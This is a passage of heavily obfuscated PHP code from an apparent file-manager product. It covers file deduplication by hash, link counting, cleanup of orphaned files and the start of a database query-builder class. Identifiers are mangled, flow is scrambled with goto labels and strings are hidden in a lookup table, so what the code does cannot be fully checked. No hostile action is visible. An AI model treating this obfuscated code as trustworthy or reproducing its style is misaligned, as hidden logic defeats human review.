$FâÅ‹ÑÖøŞ = $this->add($a“è“¥¶—¶); return $this->find($FâÅ‹ÑÖøŞ); } public function addFile($f°ñ³Œé©¬, $Ağ‚„õ…†Ğ, $A¾Å±Ê¬áĞ = false) { goto EÎ‹‚…É¸¯; EÎ‹‚…É¸¯: $f¢¶„Š”² = IO::hashSimple($f°ñ³Œé©¬); $E¯ïŠ‹ = IO::hashMd5($f°ñ³Œé©¬); $Eî‹÷–¸æØ = IO::size($f°ñ³Œé©¬); goto bîù†í®Ú¬; bîù†í®Ú¬: $C›Çà£‡§² = $_SERVER[ä°„ä°º][1779] . $E¯ïŠ‹; CacheLock::lock($C›Çà£‡§²); if ($fğ‚×•º¯ = $this->addFileCheckExist($f¢¶„Š”², $E¯ïŠ‹, $Eî‹÷–¸æØ)) { CacheLock::unlock($C›Çà£‡§²); return $fğ‚×•º¯; } goto AŞ¬¾ĞŒ£¶; AŞ¬¾ĞŒ£¶: $F®³ƒ™–ƒÙ = $this->addFileMake($f°ñ³Œé©¬, $Eî‹÷–¸æØ, $f¢¶„Š”², $E¯ïŠ‹, $Ağ‚„õ…†Ğ, $A¾Å±Ê¬áĞ); $e­‚İù„£  = $this->addFileData($F®³ƒ™–ƒÙ); CacheLock::unlock($C›Çà£‡§²); goto C“­ßÇ’µ; C“­ßÇ’µ: return $e­‚İù„£ ; goto A£¨Şš¯ëß; A£¨Şš¯ëß: } public function addFileMake($aï¯ÙĞÎ¸, $f§¢øš´½, $f¾°ĞÔ„¤, $EÍÊ‹ìÌØ, $FßçÌİÛ, $bŞ¾˜ùË‘è) { goto f˜ ËÜí…»; f˜ ËÜí…»: $f¬õĞî½ˆÎ =& $_SERVER[ä°„ä°º]; $EöÇåÖƒ‹ = $this->createFileName($FßçÌİÛ, $f¾°ĞÔ„¤, $EÍÊ‹ìÌØ); $f‰‹µ ‘– = get_path_father($EöÇåÖƒ‹); goto f›‘é¼¡îØ; f›‘é¼¡îØ: $Dª¦³êÍ¬ê = get_path_this($EöÇåÖƒ‹); if ($bŞ¾˜ùË‘è) { $Böçİ•öÄÉ = IO::move($aï¯ÙĞÎ¸, $f‰‹µ ‘–, !1, $Dª¦³êÍ¬ê); } else { $Böçİ•öÄÉ = IO::copy($aï¯ÙĞÎ¸, $f‰‹µ ‘–, !1, $Dª¦³êÍ¬ê); } if (!$Böçİ•öÄÉ) { return !1; } goto Ağº¶†®÷É; Ağº¶†®÷É: $däª­²èÁ = KodIO::defaultDriver(); $CˆÍÏìó = array($f¬õĞî½ˆÎ[561] => $f§¢øš´½, $f¬õĞî½ˆÎ[1776] => 1, $f¬õĞî½ˆÎ[413] => $FßçÌİÛ, $f¬õĞî½ˆÎ[796] => $däª­²èÁ[$f¬õĞî½ˆÎ[393]], $f¬õĞî½ˆÎ[414] => $EöÇåÖƒ‹, $f¬õĞî½ˆÎ[1777] => $f¾°ĞÔ„¤, $f¬õĞî½ˆÎ[1778] => $EÍÊ‹ìÌØ); return $CˆÍÏìó; goto Dã’¡‘Ø±ì; Dã’¡‘Ø±ì: } public function addFileCheckExist($b×¦éÛ¹±‹, $e”Öôå“İ½, $bÎË¾ç) { $dŒÇ ’”ª =& $_SERVER[ä°„ä°º]; $bíïĞë…Ğ = $this->findByHash($b×¦éÛ¹±‹, $e”Öôå“İ½); if (!$bíïĞë…Ğ) { return !1; } $FĞ–Ç¨àÜæ = array($dŒÇ ’”ª[1776] => intval($bíïĞë…Ğ[$dŒÇ ’”ª[1780]]) + 1, $dŒÇ ’”ª[561] => $bÎË¾ç); $this->where(array($dŒÇ ’”ª[448] => $bíïĞë…Ğ[$dŒÇ ’”ª[447]]))->save($FĞ–Ç¨àÜæ); return $bíïĞë…Ğ; } public function remove($cŒöÃ†½’–) { $this->linkCountChange($cŒöÃ†½’–, !1); $this->clearEmpty(); return !0; } public function linkAdd($DëÈ¡õõñß) { $this->linkCountChange($DëÈ¡õõñß, !0); } public function linkCountChange($Fîíòó¿ù, $fÌÉäŞÃç‚) { goto Cğ´•×„‰±; bÂá¥²ï: foreach ($AïØ÷ã¿™ as $DĞ÷†ŒÖ ¯ => $D® ™–ŞÖŒ) { $A¬øĞâÁŒˆ = $D® ™–ŞÖŒ . $dºï·Øª£¶[33]; if (!$AêµØÏõÍƒ[$A¬øĞâÁŒˆ]) { $AêµØÏõÍƒ[$A¬øĞâÁŒˆ] = array(); } $AêµØÏõÍƒ[$A¬øĞâÁŒˆ][] = $DĞ÷†ŒÖ ¯; } foreach ($AêµØÏõÍƒ as $D® ™–ŞÖŒ => $eÑ¦á®·£“) { if (!$eÑ¦á®·£“) { continue; } $D® ™–ŞÖŒ = $fÌÉäŞÃç‚ ? $D® ™–ŞÖŒ : -intval($D® ™–ŞÖŒ); $A¿¡Ì³Ê ­ = array($dºï·Øª£¶[447] => array($dºï·Øª£¶[7], $eÑ¦á®·£“)); if ($D® ™–ŞÖŒ < 0) { $A¿¡Ì³Ê ­[$dºï·Øª£¶[1780]] = array($dºï·Øª£¶[994], abs($D® ™–ŞÖŒ)); } $this->where($A¿¡Ì³Ê ­)->setAdd($dºï·Øª£¶[1780], $D® ™–ŞÖŒ); } goto eçº¼´ï«; då¯‘ØÛíí: $AïØ÷ã¿™ = array(); foreach ($Fîíòó¿ù as $DĞ÷†ŒÖ ¯) { $A¬øĞâÁŒˆ = $DĞ÷†ŒÖ ¯ . $dºï·Øª£¶[33]; if (!$AïØ÷ã¿™[$A¬øĞâÁŒˆ]) { $AïØ÷ã¿™[$A¬øĞâÁŒˆ] = 0; } $AïØ÷ã¿™[$A¬øĞâÁŒˆ]++; } $AêµØÏõÍƒ = array(); goto bÂá¥²ï; Cğ´•×„‰±: $dºï·Øª£¶ =& $_SERVER[ä°„ä°º]; if (!$Fîíòó¿ù) { return; } if (!is_array($Fîíòó¿ù)) { $Fîíòó¿ù = array($Fîíòó¿ù); } goto då¯‘ØÛíí; eçº¼´ï«: } public function findByHash($eå÷¥›ó¾, $C½Ú÷‘›Ï½ = false) { $d‰œÇ‡†ê =& $_SERVER[ä°„ä°º]; if (!$eå÷¥›ó¾ && !$C½Ú÷‘›Ï½) { return !1; } $B¼‰ŒìàÂ = array($d‰œÇ‡†ê[1777] => $eå÷¥›ó¾); if ($C½Ú÷‘›Ï½) { $B¼‰ŒìàÂ = array($d‰œÇ‡†ê[1778] => $C½Ú÷‘›Ï½); } return $this->order($d‰œÇ‡†ê[1781])->where($B¼‰ŒìàÂ)->find(); } public function clearEmpty($F’ƒìáÄï = 0) { goto E’©îÑªº; E’©îÑªº: $E¼å“ñ®øã =& $_SERVER[ä°„ä°º]; $EäŠÑİ™Íš = time() - 3600 * 24 * $F’ƒìáÄï; $a†ê¬•»‹á = $E¼å“ñ®øã[1782] . $EäŠÑİ™Íš; goto d»Â¼Õ; C…Î„øÇÓê: foreach ($cí¹Ëœòâ› as $Bô¸¼‘ˆë) { $f÷ÂÇ†æ ¿->update(1); $this->resetFile($Bô¸¼‘ˆë); } $f÷ÂÇ†æ ¿->end(); goto dÑß¢Ã¨Š¼; d»Â¼Õ: $cí¹Ëœòâ› = $this->where($a†ê¬•»‹á)->select(); if (!$cí¹Ëœòâ›) { return; } $f÷ÂÇ†æ ¿ = new Task($E¼å“ñ®øã[1783], $E¼å“ñ®øã[33], count($cí¹Ëœòâ›)); goto C…Î„øÇÓê; dÑß¢Ã¨Š¼: } public function resetFile($aÔØï„À¢Ä) { goto AëÁŞÎõî; AëÁŞÎõî: $FŠ¸¿ÎÇÕÆ =& $_SERVER[ä°„ä°º]; $c…¶àª‡î = array($FŠ¸¿ÎÇÕÆ[448] => $aÔØï„À¢Ä[$FŠ¸¿ÎÇÕÆ[447]]); $CÈÓóç×…÷ = Model($FŠ¸¿ÎÇÕÆ[1227])->where($c…¶àª‡î)->count(); goto cÊ¹„·äŠÅ; cÊ¹„·äŠÅ: $eñ…£õ¼‡¬ = Model($FŠ¸¿ÎÇÕÆ[1784])->where($c…¶àª‡î)->count(); $d­òä¢á„ = intval($CÈÓóç×…÷) + intval($eñ…£õ¼‡¬); if ($d­òä¢á„ == 0) { IO::remove($aÔØï„À¢Ä[$FŠ¸¿ÎÇÕÆ[76]]); Model($FŠ¸¿ÎÇÕÆ[1785])->delete($aÔØï„À¢Ä[$FŠ¸¿ÎÇÕÆ[447]]); $this->where($c…¶àª‡î)->delete(); $this->metaSet($aÔØï„À¢Ä[$FŠ¸¿ÎÇÕÆ[447]], null, null); return; } goto c’†›ø¥; c’†›ø¥: if ($aÔØï„À¢Ä[$FŠ¸¿ÎÇÕÆ[1780]] != $d­òä¢á„) { $this->where($c…¶àª‡î)->save(array($FŠ¸¿ÎÇÕÆ[1776] => $d­òä¢á„)); } goto AÈ ÚŒéÉ; AÈ ÚŒéÉ: } public function storageInfo($C¹ñå£ÄìÎ = false) { goto FñçÙ²ôä; FñçÙ²ôä: $eÑ§Ëİ­ËÈ =& $_SERVER[ä°„ä°º]; $fæ—Ì¥Ú˜ê = $this->count() + 0.0; $E÷‘µ‘ÆÑ— = 0; goto F†Ö†¥Ó´; A°Ï åÒÑ—: for ($AçÈÂ´Šµ = 0; $AçÈÂ´Šµ < $fæ—Ì¥Ú˜ê; $AçÈÂ´Šµ = $AçÈÂ´Šµ + $BÇ–˜Šò²Ğ) { $Bˆ­’ÈğÕŠ = $this->limit($AçÈÂ´Šµ, $AçÈÂ´Šµ + $BÇ–˜Šò²Ğ)->select(); foreach ($Bˆ­’ÈğÕŠ as $b¬È÷ˆ¥èÅ) { $F¸Ã¬¾Ğ–‚ += $b¬È÷ˆ¥èÅ[$eÑ§Ëİ­ËÈ[78]] * $b¬È÷ˆ¥èÅ[$eÑ§Ëİ­ËÈ[1780]]; $E÷‘µ‘ÆÑ— += $b¬È÷ˆ¥èÅ[$eÑ§Ëİ­ËÈ[78]] * ($b¬È÷ˆ¥èÅ[$eÑ§Ëİ­ËÈ[1780]] - 1); $fõÛêƒ×œÊ += $b¬È÷ˆ¥èÅ[$eÑ§Ëİ­ËÈ[1780]]; } } $bñá ‚œöÙ = array($eÑ§Ëİ­ËÈ[1786] => $F¸Ã¬¾Ğ–‚, $eÑ§Ëİ­ËÈ[1787] => $E÷‘µ‘ÆÑ—, $eÑ§Ëİ­ËÈ[1788] => $E÷‘µ‘ÆÑ— / $F¸Ã¬¾Ğ–‚, $eÑ§Ëİ­ËÈ[82] => $fæ—Ì¥Ú˜ê, $eÑ§Ëİ­ËÈ[1789] => $fõÛêƒ×œÊ); return $bñá ‚œöÙ; goto a¯ç¸Ë´±Ê; F†Ö†¥Ó´: $F¸Ã¬¾Ğ–‚ = 1; $fõÛêƒ×œÊ = 0; $BÇ–˜Šò²Ğ = 5000; goto A°Ï åÒÑ—; a¯ç¸Ë´±Ê: } } goto EÁµÏìŞö¼; cìòÃ‘‰¾›: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\156\145\x71" => "\74\76", "\147\x74" => "\76", "\145\x67\164" => "\76\x3d", "\154\x74" => "\x3c", "\x65\x6c\164" => "\74\x3d", "\156\x6f\x74\154\151\153\145" => "\x4e\x4f\124\40\114\x49\113\x45", "\154\151\x6b\145" => "\x4c\x49\x4b\x45", "\151\x6e" => "\111\x4e", "\x6e\157\x74\151\x6e" => "\116\117\124\40\111\116", "\156\157\x74\x20\x69\156" => "\x4e\x4f\124\x20\x49\116", "\142\145\164\x77\145\145\x6e" => "\x42\x45\124\127\105\105\116", "\x6e\x6f\164\x62\145\164\167\x65\145\x6e" => "\x4e\117\x54\40\x42\x45\x54\x57\105\x45\116", "\156\x6f\164\40\x62\x65\x74\167\145\x65\156" => "\116\117\x54\x20\102\105\x54\127\105\105\116"); protected $selectSql = "\123\105\x4c\105\103\x54\45\x44\x49\x53\x54\x49\x4e\103\124\x25\x20\45\106\111\105\114\104\x25\x20\106\122\117\x4d\40\45\x54\101\102\x4c\x45\45\x25\x4a\117\111\116\x25\x25\127\x48\105\x52\105\45\x25\x47\122\x4f\x55\x50\x25\x25\x48\x41\126\x49\x4e\107\45\x25\117\x52\x44\105\x52\x25\x25\114\111\x4d\111\x54\x25\40\45\x55\116\x49\x4f\x4e\x25\45\x43\x4f\x4d\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $EäÎ÷ìØÙ« = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ä°„ä°º][941], $EäÎ÷ìØÙ«); } public function factory($F¨™Ï©Í„… = '') { goto B ªğğñ; Cõ®›àèÄ: return $A¾Ÿ·äŸ¢; goto A‚ëºéóå¿; f±õµ†‘»: $this->dbType = ucwords(strtolower($F¨™Ï©Í„…[$eÔ†ãÍŒøƒ[942]])); $eÓ‰ÅÜßõ× = $eÔ†ãÍŒøƒ[944] . $this->dbType; if (class_exists($eÓ‰ÅÜßõ×)) { $A¾Ÿ·äŸ¢ = new $eÓ‰ÅÜßõ×($F¨™Ï©Í„…); if ($eÔ†ãÍŒøƒ[778] != strtolower($F¨™Ï©Í„…[$eÔ†ãÍŒøƒ[942]])) { $A¾Ÿ·äŸ¢->dbType = strtoupper($this->dbType); } else { $A¾Ÿ·äŸ¢->dbType = $this->_getDsnType($F¨™Ï©Í„…[$eÔ†ãÍŒøƒ[897]]); } } else { think_exception(think_lang($eÔ†ãÍŒøƒ[945]) . $eÔ†ãÍŒøƒ[946] . $eÓ‰ÅÜßõ×); } goto Cõ®›àèÄ; B ªğğñ: $eÔ†ãÍŒøƒ =& $_SERVER[ä°„ä°º]; $F¨™Ï©Í„… = $this->parseConfig($F¨™Ï©Í„…); if (empty($F¨™Ï©Í„…[$eÔ†ãÍŒøƒ[942]])) { think_exception(think_lang($eÔ†ãÍŒøƒ[943])); } goto f±õµ†‘»; A‚ëºéóå¿: } public function __call($eÅ„ÚĞ‡Ğ², $d›‰½Ò·ÙÕ) { if (method_exists($this, $eÅ„ÚĞ‡Ğ²)) { return call_user_func_array(array($this, $eÅ„ÚĞ‡Ğ²), $d›‰½Ò·ÙÕ); } } protected function _getDsnType($aìˆ»Ÿèğˆ) { $Eİ¸…Ğ÷Ó‰ = explode($_SERVER[ä°„ä°º][4], $aìˆ»Ÿèğˆ); $E¸™¤¡çö” = strtoupper(trim($Eİ¸…Ğ÷Ó‰[0])); return $E¸™¤¡çö”; } private function parseConfig($f¸ Ù¶š¬Ó = '') { $b£Í¬ÆÕ§İ =& $_SERVER[ä°„ä°º]; if (!empty($f¸ Ù¶š¬Ó) && is_string($f¸ Ù¶š¬Ó)) { $f¸ Ù¶š¬Ó = $this->parseDSN($f¸ Ù¶š¬Ó); } elseif (is_array($f¸ Ù¶š¬Ó)) { $f¸ Ù¶š¬Ó = array_change_key_case($f¸ Ù¶š¬Ó); $f¸ Ù¶š¬Ó = array($b£Í¬ÆÕ§İ[942] => $f¸ Ù¶š¬Ó[$b£Í¬ÆÕ§İ[777]], $b£Í¬ÆÕ§İ[870] => $f¸ Ù¶š¬Ó[$b£Í¬ÆÕ§İ[947]], $b£Í¬ÆÕ§İ[871] => $f¸ Ù¶š¬Ó[$b£Í¬ÆÕ§İ[948]], $b£Í¬ÆÕ§İ[868] => $f¸ Ù¶š¬Ó[$b£Í¬ÆÕ§İ[949]], $b£Í¬ÆÕ§İ[869] => $f¸ Ù¶š¬Ó[$b£Í¬ÆÕ§İ[950]], $b£Í¬ÆÕ§İ[17] => $f¸ Ù¶š¬Ó[$b£Í¬ÆÕ§İ[951]], $b£Í¬ÆÕ§İ[897] => $f¸ Ù¶š¬Ó[$b£Í¬ÆÕ§İ[779]], $b£Í¬ÆÕ§İ[13] => isset($f¸ Ù¶š¬Ó[$b£Í¬ÆÕ§İ[952]]) ? $f¸ Ù¶š¬Ó[$b£Í¬ÆÕ§İ[952]] : array()); } elseif (empty($f¸ Ù¶š¬Ó)) { if (think_config($b£Í¬ÆÕ§İ[953]) && $b£Í¬ÆÕ§İ[778] != strtolower(think_config($b£Í¬ÆÕ§İ[954]))) { $f¸ Ù¶š¬Ó = $this->parseDSN(think_config($b£Í¬ÆÕ§İ[953])); } else { $f¸ Ù¶š¬Ó = array($b£Í¬ÆÕ§İ[942] => think_config($b£Í¬ÆÕ§İ[954]), $b£Í¬ÆÕ§İ[870] => think_config($b£Í¬ÆÕ§İ[955]), $b£Í¬ÆÕ§İ[871] => think_config($b£Í¬ÆÕ§İ[956]), $b£Í¬ÆÕ§İ[868] => think_config($b£Í¬ÆÕ§İ[957]), $b£Í¬ÆÕ§İ[869] => think_config($b£Í¬ÆÕ§İ[958]), $b£Í¬ÆÕ§İ[17] => think_config($b£Í¬ÆÕ§İ[244]), $b£Í¬ÆÕ§İ[897] => think_config($b£Í¬ÆÕ§İ[953]), $b£Í¬ÆÕ§İ[13] => think_config($b£Í¬ÆÕ§İ[959])); } } return $f¸ Ù¶š¬Ó; } protected function initConnect($aÊè©ëÁ×¸ = true) { if (1 == think_config($_SERVER[ä°„ä°º][18])) { $this->_linkID = $this->multiConnect($aÊè©ëÁ×¸); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $Eá‘­ÖÂ•ò => $d õ­ğ•–) { $this->_linkID = $d õ­ğ•–; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($eÙ™ˆÙœóÏ = false) { goto B—æšõé‘”; B—æšõé‘”: $dÈä òÄ–Î =& $_SERVER[ä°„ä°º]; static $F ²¢óÆ¥Ï = array(); static $dÂò§Ò³ó£ = -1; goto Aõ³À‡”; Aõ³À‡”: if (empty($F ²¢óÆ¥Ï)) { foreach ($this->config as $dôÒ„ô–ñ÷ => $C…§à‰Ğ–°) { $F ²¢óÆ¥Ï[$dôÒ„ô–ñ÷] = explode($dÈä òÄ–Î[47], $C…§à‰Ğ–°); } } if (think_config($dÈä òÄ–Î[960])) { if ($eÙ™ˆÙœóÏ) { $cÇ­¨÷°î´ = floor(mt_rand(0, think_config($dÈä òÄ–Î[961]) - 1)); $dÂò§Ò³ó£ = $cÇ­¨÷°î´; } else { if (is_numeric(think_config($dÈä òÄ–Î[962]))) { $cÇ­¨÷°î´ = think_config($dÈä òÄ–Î[962]); } else { $cÇ­¨÷°î´ = floor(mt_rand(think_config($dÈä òÄ–Î[961]), count($F ²¢óÆ¥Ï[$dÈä òÄ–Î[868]]) - 1)); } } } else { $cÇ­¨÷°î´ = floor(mt_rand(0, count($F ²¢óÆ¥Ï[$dÈä òÄ–Î[868]]) - 1)); $dÂò§Ò³ó£ = $cÇ­¨÷°î´; } $cÇ­¨÷°î´ = $dÂò§Ò³ó£ !== -1 ? $dÂò§Ò³ó£ : $cÇ­¨÷°î´; goto fˆ–³åĞÁ; fˆ–³åĞÁ: $B´Ş¸ÆØ™† = array($dÈä òÄ–Î[870] => isset($F ²¢óÆ¥Ï[$dÈä òÄ–Î[870]][$cÇ­¨÷°î´]) ? $F ²¢óÆ¥Ï[$dÈä òÄ–Î[870]][$cÇ­¨÷°î´] : $F ²¢óÆ¥Ï[$dÈä òÄ–Î[870]][0], $dÈä òÄ–Î[871] => isset($F ²¢óÆ¥Ï[$dÈä òÄ–Î[871]][$cÇ­¨÷°î´]) ? $F ²¢óÆ¥Ï[$dÈä òÄ–Î[871]][$cÇ­¨÷°î´] : $F ²¢óÆ¥Ï[$dÈä òÄ–Î[871]][0], $dÈä òÄ–Î[868] => isset($F ²¢óÆ¥Ï[$dÈä òÄ–Î[868]][$cÇ­¨÷°î´]) ? $F ²¢óÆ¥Ï[$dÈä òÄ–Î[868]][$cÇ­¨÷°î´] : $F ²¢óÆ¥Ï[$dÈä òÄ–Î[868]][0], $dÈä òÄ–Î[869] => isset($F ²¢óÆ¥Ï[$dÈä òÄ–Î[869]][$cÇ­¨÷°î´]) ? $F ²¢óÆ¥Ï[$dÈä òÄ–Î[869]][$cÇ­¨÷°î´] : $F ²¢óÆ¥Ï[$dÈä òÄ–Î[869]][0], $dÈä òÄ–Î[17] => isset($F ²¢óÆ¥Ï[$dÈä òÄ–Î[17]][$cÇ­¨÷°î´]) ? $F ²¢óÆ¥Ï[$dÈä òÄ–Î[17]][$cÇ­¨÷°î´] : $F ²¢óÆ¥Ï[$dÈä òÄ–Î[17]][0], $dÈä òÄ–Î[897] => isset($F ²¢óÆ¥Ï[$dÈä òÄ–Î[897]][$cÇ­¨÷°î´]) ? $F ²¢óÆ¥Ï[$dÈä òÄ–Î[897]][$cÇ­¨÷°î´] : $F ²¢óÆ¥Ï[$dÈä òÄ–Î[897]][0], $dÈä òÄ–Î[13] => isset($F ²¢óÆ¥Ï[$dÈä òÄ–Î[13]][$cÇ­¨÷°î´]) ? $F ²¢óÆ¥Ï[$dÈä òÄ–Î[13]][$cÇ­¨÷°î´] : $F ²¢óÆ¥Ï[$dÈä òÄ–Î[13]][0]); return $this->connect($B´Ş¸ÆØ™†, $cÇ­¨÷°î´); goto bî–ïŞœ“; bî–ïŞœ“: } public function parseDSN($b±‹ÙÇå™Ç) { $F£ÖÙ•†æ¡ =& $_SERVER[ä°„ä°º]; if (empty($b±‹ÙÇå™Ç)) { return !1; } $D³Ö¨×Ò÷ = parse_url($b±‹ÙÇå™Ç); if ($D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[174]]) { $Aİªà‹Ğ®Í = array($F£ÖÙ•†æ¡[942] => $D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[174]], $F£ÖÙ•†æ¡[870] => isset($D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[575]]) ? $D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[575]] : $F£ÖÙ•†æ¡[33], $F£ÖÙ•†æ¡[871] => isset($D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[963]]) ? $D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[963]] : $F£ÖÙ•†æ¡[33], $F£ÖÙ•†æ¡[868] => isset($D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[175]]) ? $D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[175]] : $F£ÖÙ•†æ¡[33], $F£ÖÙ•†æ¡[869] => isset($D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[176]]) ? $D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[176]] : $F£ÖÙ•†æ¡[33], $F£ÖÙ•†æ¡[17] => isset($D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[76]]) ? substr($D³Ö¨×Ò÷[$F£ÖÙ•†æ¡[76]], 1) : $F£ÖÙ•†æ¡[33]); } else { preg_match($F£ÖÙ•†æ¡[964], trim($b±‹ÙÇå™Ç), $cĞø‘‰×ñİ); $Aİªà‹Ğ®Í = array($F£ÖÙ•†æ¡[942] => $cĞø‘‰×ñİ[1], $F£ÖÙ•†æ¡[870] => $cĞø‘‰×ñİ[2], $F£ÖÙ•†æ¡[871] => $cĞø‘‰×ñİ[3], $F£ÖÙ•†æ¡[868] => $cĞø‘‰×ñİ[4], $F£ÖÙ•†æ¡[869] => $cĞø‘‰×ñİ[5], $F£ÖÙ•†æ¡[17] => $cĞø‘‰×ñİ[6]); } $Aİªà‹Ğ®Í[$F£ÖÙ•†æ¡[897]] = $F£ÖÙ•†æ¡[33]; return $Aİªà‹Ğ®Í; } protected function debug() { $f¹¤Åõå‘« =& $_SERVER[ä°„ä°º]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $f¹¤Åõå‘«[965]; if (think_config($f¹¤Åõå‘«[966])) { think_status($f¹¤Åõå‘«[967]); think_trace($this->queryStr . $f¹¤Åõå‘«[968] . think_status($f¹¤Åõå‘«[20], $f¹¤Åõå‘«[967], 6) . $f¹¤Åõå‘«[969], $f¹¤Åõå‘«[33], $f¹¤Åõå‘«[970]); } } protected function parseLock($e­ŞæáŞçÃ = false) { $FÀš‚Ç‚Ë =& $_SERVER[ä°„ä°º]; if (!$e­ŞæáŞçÃ) { return $FÀš‚Ç‚Ë[33]; } if ($FÀš‚Ç‚Ë[899] == $this->dbType) { return $FÀš‚Ç‚Ë[971]; } return $FÀš‚Ç‚Ë[972]; } protected function parseSet($c³“«³öÓº) { $A¸­ë™«öô =& $_SERVER[ä°„ä°º]; foreach ($c³“«³öÓº as $açá¬»‹ß => $FÔ†é…·¼) { if (is_array($FÔ†é…·¼) && $A¸­ë™«öô[295] == $FÔ†é…·¼[0]) { $b‡ÚÁö° “[] = $this->parseKey($açá¬»‹ß) . $A¸­ë™«öô[973] . $FÔ†é…·¼[1]; } elseif (is_scalar($FÔ†é…·¼) || is_null($FÔ†é…·¼)) { $b‡ÚÁö° “[] = $this->parseKey($açá¬»‹ß) . $A¸­ë™«öô[973] . $this->parseValue($FÔ†é…·¼); } } return $A¸­ë™«öô[974] . implode($A¸­ë™«öô[47], $b‡ÚÁö° “); } protected function bindParam($C¢ªŠ¿ôë, $CÕÑ –Õ…Ñ) { $this->bind[$_SERVER[ä°„ä°º][4] . $C¢ªŠ¿ôë] = $CÕÑ –Õ…Ñ; } protected function parseBind($c„èôØá˜) { $c„èôØá˜ = array_merge($this->bind, $c„èôØá˜); $this->bind = array(); return $c„èôØá˜; } function parseKey(&$D…Û±¬Å¼­, $fß‡”‹Ê³Ö = true) { if ($fß‡”‹Ê³Ö) { $D…Û±¬Å¼­ = $this->parseKeyCheck($D…Û±¬Å¼­); } return $D…Û±¬Å¼­; } function parseKeyCheck($aë¥–À£êÌ) { $dó‚Š„„Û¶ =& $_SERVER[ä°„ä°º]; $aë¥–À£êÌ = trim($aë¥–À£êÌ); if (!preg_match($dó‚Š„„Û¶[975], $aë¥–À£êÌ)) { think_exception($dó‚Š„„Û¶[976] . $aë¥–À£êÌ); } return $aë¥–À£êÌ; } protected function parseValue($c¢™ÅéÛ˜ù) { $Dœ“ÃØ‚—Ô =& $_SERVER[ä°„ä°º]; if (is_string($c¢™ÅéÛ˜ù)) { $c¢™ÅéÛ˜ù = $Dœ“ÃØ‚—Ô[938] . $this->escapeString($c¢™ÅéÛ˜ù) . $Dœ“ÃØ‚—Ô[938]; } elseif (isset($c¢™ÅéÛ˜ù[0]) && is_string($c¢™ÅéÛ˜ù[0]) && strtolower($c¢™ÅéÛ˜ù[0]) == $Dœ“ÃØ‚—Ô[295]) { $c¢™ÅéÛ˜ù = $this->escapeString($c¢™ÅéÛ˜ù[1]); } elseif (is_array($c¢™ÅéÛ˜ù)) { $c¢™ÅéÛ˜ù = array_map(array($this, $Dœ“ÃØ‚—Ô[939]), $c¢™ÅéÛ˜ù); } elseif (is_bool($c¢™ÅéÛ˜ù)) { $c¢™ÅéÛ˜ù = $c¢™ÅéÛ˜ù ? $Dœ“ÃØ‚—Ô[87] : $Dœ“ÃØ‚—Ô[191]; } elseif (is_null($c¢™ÅéÛ˜ù)) { $c¢™ÅéÛ˜ù = $Dœ“ÃØ‚—Ô[103]; } return $c¢™ÅéÛ˜ù; } protected function parseField($A½¤“¢ç²š) { $cêÊñ¹–© =& $_SERVER[ä°„ä°º]; if (is_string($A½¤“¢ç²š) && strpos($A½¤“¢ç²š, $cêÊñ¹–©[47])) { $A½¤“¢ç²š = explode($cêÊñ¹–©[47], $A½¤“¢ç²š); } if (is_array($A½¤“¢ç²š)) { $Føè½¯ç•ò = array(); foreach ($A½¤“¢ç²š as $E—®ƒ¬ìé˜ => $E±šççÍœĞ) { if (!is_numeric($E—®ƒ¬ìé˜)) { $Føè½¯ç•ò[] = $this->parseKey($E—®ƒ¬ìé˜, !1) . $cêÊñ¹–©[977] . $this->parseKey($E±šççÍœĞ); } else { $Føè½¯ç•ò[] = $this->parseKey($E±šççÍœĞ); } } $a¼Ó×¼Ü¨’ = implode($cêÊñ¹–©[47], $Føè½¯ç•ò); } elseif (is_string($A½¤“¢ç²š) && !empty($A½¤“¢ç²š)) { $a¼Ó×¼Ü¨’ = $A½¤“¢ç²š; } else { $a¼Ó×¼Ü¨’ = $cêÊñ¹–©[182]; } return $a¼Ó×¼Ü¨’; } protected function parseTable($f¨¾ä¯¯È) { $eÌ™‰•ìø =& $_SERVER[ä°„ä°º]; if (is_array($f¨¾ä¯¯È)) { $aÜ—©ƒÚÎ = array(); foreach ($f¨¾ä¯¯È as $F¥Æ§Ë¿é¸ => $C‚ê¯ Ñ°) { if (!is_numeric($F¥Æ§Ë¿é¸)) { $aÜ—©ƒÚÎ[] = $this->parseKey($F¥Æ§Ë¿é¸) . $eÌ™‰•ìø[50] . $this->parseKey($C‚ê¯ Ñ°); } else { $aÜ—©ƒÚÎ[] = $this->parseKey($F¥Æ§Ë¿é¸); } } $f¨¾ä¯¯È = $aÜ—©ƒÚÎ; } elseif (is_string($f¨¾ä¯¯È)) { if (strstr($f¨¾ä¯¯È, $eÌ™‰•ìø[50])) { return $f¨¾ä¯¯È; } $f¨¾ä¯¯È = explode($eÌ™‰•ìø[47], $f¨¾ä¯¯È); array_walk($f¨¾ä¯¯È, array($this, $eÌ™‰•ìø[888])); } return $eÌ™‰•ìø[882] . trim(implode($eÌ™‰•ìø[978], $f¨¾ä¯¯È), $eÌ™‰•ìø[382]) . $eÌ™‰•ìø[882]; } protected function parseWhere($B×Á°å¬•È) { $cŒÄî”É»À =& $_SERVER[ä°„ä°º]; $E™¸öŸ«² = $cŒÄî”É»À[33]; if (is_string($B×Á°å¬•È)) { $E™¸öŸ«² = 